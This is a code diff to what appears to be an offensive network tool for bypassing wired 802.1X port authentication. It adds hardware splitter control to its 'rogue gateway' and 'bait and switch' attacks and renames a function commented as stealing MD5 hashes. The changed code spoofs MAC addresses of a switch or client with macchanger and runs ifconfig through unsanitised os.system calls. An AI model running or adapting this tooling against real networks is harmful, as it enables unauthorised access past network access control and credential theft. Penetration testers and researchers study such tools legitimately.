@@ -10,11 +10,28 @@ import core.analyzer
 import core.injector
 import core.core_config
 import core.cli
+import core.splitters
 
 import settings.paths
 
 from core.hostapd import Hostapd
 from core.cert_manager import cert_manager
+
+def splitter_control(configs, options):
+
+    if options['upstream_splitter'] == 'connect':
+        upstream_state = True
+    elif options['upstream_splitter'] == 'bypass':
+        upstream_state = False
+    if options['phy_splitter'] == 'connect':
+        phy_state = True
+    elif options['phy_splitter'] == 'bypass':
+        phy_state = False
+
+    splitters = core.splitters.Splitters()
+    splitters.set_phy(phy_state)
+    splitters.set_upstream(upstream_state)
+    splitters.print_state(pretty=True)
 
 
 def cert_wizard(configs, options):
@@ -157,7 +174,7 @@ def ifaces_up(configs, options):
     bridge.all_ifaces_up()
 
 # determine eap type and steal md5 hashes
-def analyze_auth(configs, options):
+def analyze_auth_active(configs, options):
 
     bridge_iface = options['bridge']
     client_mac = options['client_mac']
@@ -183,17 +200,38 @@ def analyze_auth(configs, options):
 
 def rogue_gateway(configs, options):
 
+    switch_mac = options['switch_mac']
+    client_mac = options['client_mac']
+    phy = options['phy']
+    use_splitters = options['use_splitters']
+
+    if use_splitters:
+
+        splitters = core.splitters.Splitters()
+
+        # start in bypass
+        print '[*] Setting splitters to mode: bypass'
+        splitters.set_phy(False)
+        splitters.set_upstream(False)
+        splitters.print_state(pretty=True)
+
+        # wait a few seconds then connect supplicant to PHY
+        # and leave upstream disconnected
+        time.sleep(2)
+        print '[*] Setting PHY splitter to mode: connect'
+        splitters.set_phy(True)
+
+        # wait a few more seconds
+        time.sleep(5)
+
     # start with bridge and all slave ifaces down
     print '[*] Bringing bridge down...'
     try:
         bridge_down(configs, options)
     except OSError:
-        print '[*] No bridge found... you should probably the bridge before using this attack'
+        print '[*] No bridge found... bringing PHY down independently...'
+        os.system('ifconfig %s down' % phy)
         pass
-
-    switch_mac = options['switch_mac']
-    client_mac = options['client_mac']
-    phy = options['phy']
 
     # phy mac address to mac address of switch
     print '[*] Setting MAC address of PHY to match MAC address of upstream switch...'
@@ -231,15 +269,42 @@ def rogue_gateway(configs, options):
     print '[*] Attack is stopped.'
 
     print '[*] Bridge and all iface slaves are down.'
+
+    if use_splitters:
+
+        print '[*] Restoring splitters to mode: bypass'
+
+        # start in bypass
+        splitters.set_phy(False)
+        splitters.set_upstream(False)
+        splitters.print_state(pretty=True)
     
 # also can be used if mab is enabled
-def bate_and_switch(configs, options):
+def bait_and_switch(configs, options):
 
     client_mac = options['client_mac']
     upstream = options['upstream']
     netmask = options['netmask']
     client_ip = options['client_ip']
     wpa_supplicant_conf = options['wired_conf']
+    use_splitters = options['use_splitters']
+
+    # make sure upstream is down
+    os.system('ifconfig %s down' % (upstream))
+
+    if use_splitters:
+
+        splitters = core.splitters.Splitters()
+
+        # start in bypass
+        splitters.set_phy(False)
+        splitters.set_upstream(False)
+        splitters.print_state(pretty=True)
+
+        # wait a couple of seconds then connect authenticator to upstream
+        # and leave PHY disconnected
+        time.sleep(2)
+        splitters.set_upstream(True)
 
     # upstream mac address to mac address of client
     os.system('macchanger -m %s %s' % (client_mac, upstream))
@@ -302,11 +367,13 @@ if __name__ == '__main__':
         ifaces_up(core_conf, options)
     elif options['rogue_gateway']:
         rogue_gateway(core_conf, options)
-    elif options['bate_n_switch']:
-        bate_and_switch(core_conf, options)
-    elif options['analyze_auth']:
-        analyze_auth(core_conf, options)
+    elif options['bait_n_switch']:
+        bait_and_switch(core_conf, options)
+    elif options['analyze_auth_active']:
+        analyze_auth_active(core_conf, options)
     elif options['cert_wizard']:
         cert_wizard(core_conf, options)
     elif options['discovery']:
         discovery(core_conf, options)
+    elif options['splitterctl']:
+        splitter_control(core_conf, options)
